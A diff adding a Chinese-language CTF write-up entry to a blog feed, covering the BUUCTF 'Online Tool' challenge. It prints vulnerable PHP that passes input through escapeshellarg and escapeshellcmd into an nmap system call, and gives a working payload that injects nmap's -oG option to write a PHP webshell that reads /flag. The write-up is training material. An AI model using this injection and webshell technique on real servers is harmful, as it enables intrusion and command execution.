@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>BUU每日一题029</title>
+    <link href="/2021/02/12/BUU029/"/>
+    <url>/2021/02/12/BUU029/</url>
+    
+    <content type="html"><![CDATA[<h2 id="二十九、"><a href="#二十九、" class="headerlink" title="二十九、"></a>二十九、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[BUUCTF 2018]Online Tool<br>PHP代码审计      </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><pre><code>&lt;?phpif (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;    $_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];&#125;   //获取IP地址if(!isset($_GET[&#39;host&#39;])) &#123;    highlight_file(__FILE__);&#125; else &#123;    $host = $_GET[&#39;host&#39;];    $host = escapeshellarg($host);      //将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号    $host = escapeshellcmd($host);        //对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义，在一些字符前加上斜杠\    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);    echo &#39;you are in sandbox &#39;.$sandbox;    @mkdir($sandbox);       //新建一个以$sandbox命名的目录，@是压制错误提示的意思    chdir($sandbox);       //将PHP当前目录改为$sandbox    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125;        </code></pre><p>大致思路就是构造payload，绕过<code>escapeshellarg</code>和<code>escapeshellcmd</code>，执行命令<br>这两个函数一起使用的漏洞：<br>抄一下大佬的笔记：<br><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">谈谈escapeshellarg参数绕过和注入的问题 </a>     </p><blockquote><p>传入的参数是:<code>127.0.0.1&#39; -v -d a=1</code><br>由于escapeshellarg先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果:<code>&#39;127.0.0.1&#39;\&#39;&#39; -v -d a=1&#39;</code><br>经过escapeshellcmd针对第二步处理之后的参数中的\以及a=1’中的单引号进行处理转义之后的效果:<code>&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code>         </p></blockquote><p>但我自己试的话弄不出来大佬的结果，出来的有<code>^</code>没有<code>\</code>?????<br>构造payload<br>利用nmap的一个参数<code>-oG</code>—–可以实现将命令和结果写入文件<br>所以，就可以利用该参数写入一句话木马    </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>?host=&#39; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#39;</code><img src="https://ae02.alicdn.com/kf/H4d6f08859c3e4275a267ef0dd9273847H.jpg" alt="01.png"><br>访问该文件即可<code>/30a6175a3ca36e9980135ca86411d9ff/test.php</code><img src="https://ae04.alicdn.com/kf/H6c9b70f1de884eee962fce5afd9ba21ak.jpg" alt="02.png">      </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>几个函数       </p><p><img src="https://sc02.alicdn.com/kf/H9943108175a347bdb71414bcbcc8df20H.jpg" alt="03.png">    </p><p><img src="https://ae03.alicdn.com/kf/Ha91dc66f30444ef481fd28b72a1a5f6aO.jpg" alt="04.png"><br><a href="https://blog.csdn.net/qq_26406447/article/details/100711933">MORE</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>wp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>BUU每日一题028</title>
     <link href="/2021/02/11/BUU028/"/>
     <url>/2021/02/11/BUU028/</url>
